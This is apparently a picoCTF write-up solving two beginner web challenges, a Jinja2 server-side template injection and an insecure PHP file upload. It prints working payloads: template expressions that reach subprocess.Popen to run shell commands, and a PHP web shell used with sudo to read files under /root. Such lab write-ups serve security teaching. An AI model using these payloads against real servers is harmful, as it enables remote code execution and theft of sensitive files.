## About picoCTF

picoCTF is a beginner-friendly cybersecurity competition created by security experts at Carnegie Mellon University. It presents real-world cybersecurity challenges in a fun, gamified format that's perfect for students, hobbyists, and anyone new to CTFs (Capture The Flag). The challenges cover a range of topics‚Äîfrom basic scripting and cryptography to web exploitation and reverse engineering‚Äîmaking it a great way to learn practical hacking skills while having fun.


This is their official website : https://picoctf.org/


# WEB CTF EASY 

## SSTl1(Server side template vulnerable)



## üìå Challenge Description

> Can you exploit this website? Try to get the website to evaluate a Jinja expression.  


> Link: http://rescued-float.picoctf.net:59626/
 


## üß† Understanding the Challenge

This is a **Server-Side Template Injection (SSTI)** challenge using the **Jinja2** template engine.

Our goal is to inject Jinja2 expressions to get the server to execute arbitrary code and ultimately leak the flag.



## üõ†Ô∏è Step-by-Step Solution

### 1. Open the Website

The page asks for input and returns it rendered back. This suggests it may be vulnerable to SSTI.

![The site](images/Screenshot_2025-05-13_14_48_45.png)



### 2. Test for Injection

We enter a basic test string: 

**&#123;&#123;7*8&#125;&#125;**

If the site returns `56`, then SSTI is confirmed.

### 3. Try Accessing Built-ins

To escalate, we inject the following payload to access built-ins:


{% raw %}
**Code:** `{{ ''.__class__.mro[2].__subclasses__() }}`
{% endraw %}



This gives access to all subclasses, including `Popen`.





### 4. Find `subprocess.Popen` Index

We locate the index of `subprocess.Popen` subclass from the list and use it to execute code. Example:

{% raw %}
**Code:** `{{ ''.__class__.mro[2].__subclasses__()[<index>]("ls", shell=True, stdout=-1).communicate() }}`
{% endraw %}



Try commands like `cat flag.txt`.



### 5. Extract the Flag

Eventually, we find the flag using a working payload like:

{% raw %}
**Code:** `{{ ''.__class__.mro[2].__subclasses__()[<index>]("cat flag.txt", shell=True, stdout=-1).communicate() }}`
{% endraw %}




And finally...

## üìö Concepts Learned

- Server-Side Template Injection (SSTI)
- Jinja2 internals
- Python object hierarchy
- Remote code execution using template injection



## ‚úÖ Tips

- Always test for SSTI using `{{7*7}}`
- Use introspection to access sensitive functions
- Be cautious with payload indexing; try printing small batches to locate targets like `Popen`


## n0s4n1ty 1 (File upload vulnerabilty)

## üìå Challenge Description

> The challenge presents a **file upload vulnerability** on a web application. Our goal is to exploit this vulnerability to gain access to sensitive data or execute arbitrary code on the server to retrieve the flag.

> Link: http://standard-pizzas.picoctf.net:54419/

## üß† Understanding the Challenge

This challenge revolves around an insecure file upload feature that allows an attacker to upload any type of file. The goal is to upload a PHP file and use it to execute commands on the server.

## üõ†Ô∏è Step-by-Step Solution

### 1. Open the Website

The website provides a file upload form that accepts all file types ‚Äî including `.php`.

![Initial Site](images/2nd2.png)

### 2. Create a Malicious PHP File

We create a simple PHP web shell that takes a command from a GET parameter and executes it.

```php
<?php
    echo shell_exec($_GET['cmd']);
?>
```

Upload this file using the site‚Äôs upload feature.

### 3. Locate the Uploaded File

After uploading, we try accessing the uploaded file in a predictable upload folder like:

```
http://standard-pizzas.picoctf.net:54419/upload.php
```

We can now append commands to the URL using the `cmd` parameter, for example:

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=whoami
```


![Test Command Execution](images/2nd6.png)


When we enter: 

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=sudo -l
```

![Test Command Execution](images/2nd7.png)



This will tell us that we can run any command with any account....


Let's try as root:

To get root we need to redirect to thhis url

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=sudo ls /root
```

This will list all files in root..


**Here we found flag.txt in root folder...**
 

### 4. Find the Flag

Once we confirm that our PHP shell is working, we can try reading the flag file.

Try the following in your browser:

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=sudo cat /root/flag.txt
```

If the file exists and permissions are open, this will output the flag.

### 5. Flag Retrieved

Success! We see the flag printed on the page.

```

## üìö Concepts Learned

- Exploiting file upload vulnerabilities
- Bypassing file type restrictions
- Command execution through PHP
- Locating and reading sensitive files on a web server

## ‚úÖ Tips

- Always check file type validation on upload forms
- Try uploading `.php`, `.php5`, or `.phtml` extensions
- Use predictable paths to locate uploaded files
- Append `?cmd=COMMAND` if your payload uses GET-based command injection

{% raw %}
**Payload:** `<?php echo shell_exec($_GET['cmd']); ?>`
{% endraw %}
